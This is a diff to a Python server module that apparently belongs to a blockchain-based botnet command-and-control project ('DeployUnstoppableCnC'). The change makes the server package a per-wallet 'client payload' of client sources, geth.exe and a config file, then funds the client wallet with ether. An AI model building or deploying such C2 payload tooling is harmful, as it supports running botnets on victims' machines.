@@ -1,16 +1,11 @@
-import logging
-import yaml
-import os
-import sys
+import yaml, os, sys, glob
 from os.path import join as opj
-from Util.LogWrapper import *
-import yaml
-from solc import compile_source
 from web3 import Web3, HTTPProvider
 from web3.contract import ConciseContract
-import Client.OsInteractions as OsInteractions
-from Util.EtherKeysUtil import *
-from Server.DeployUnstoppableCnC import unlockAccount,generateKeyPair,getOwnerPassword
+from Util.EtherKeysUtil import unlockAccount, generatePassword, generateWallet, loadWallet
+from Util.LogWrapper import LogWrapper
+from shutil import copyfile,copy
+
 
 l = LogWrapper.getLogger()
 
@@ -94,11 +89,24 @@ class ServerCommands:
         #TODO add all components
         generatedDir = opj('generated',address)
         l.info('writing client payload into',generatedDir)
-        os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
-        os.makedirs(opj(generatedDir, 'src'), exist_ok=True)
+        os.makedirs(opj(generatedDir, 'src', 'Client'), exist_ok=True)
+        for file in glob.glob(opj('src', 'Client', '*.py')):
+            copy(file, opj(generatedDir, 'src', 'Client'))
+
+        os.makedirs(opj(generatedDir, 'src', 'Util'), exist_ok=True)
+        for file in glob.glob(opj('src', 'Util', '*.py')):
+            copy(file, opj(generatedDir, 'src', 'Util'))
+
         os.makedirs(opj(generatedDir, 'bin'), exist_ok=True)
-        with open(opj(generatedDir, 'conf', 'clientConf-test.yaml'), 'w') as f:
+        copy(opj('bin','geth.exe'),opj(generatedDir, 'bin'))
+        copy(opj('bin', 'genpriv.sh'), opj(generatedDir, 'bin'))
+
+        os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
+        with open(opj(generatedDir, 'conf', 'clientConf.yaml'), 'w') as f:
             yaml.safe_dump(clientConfTemplate, f)
+
+        os.makedirs(opj(generatedDir, 'src', 'build'), exist_ok=True)
+        os.makedirs(opj(generatedDir, 'src', 'logs'), exist_ok=True)
 
         l.info ("Sending ",self.web3.fromWei(fundValue,"ether"),"ether to client wallet")
         sc.web3.eth.sendTransaction({'from': sc.ownerAddress, 'to': address,
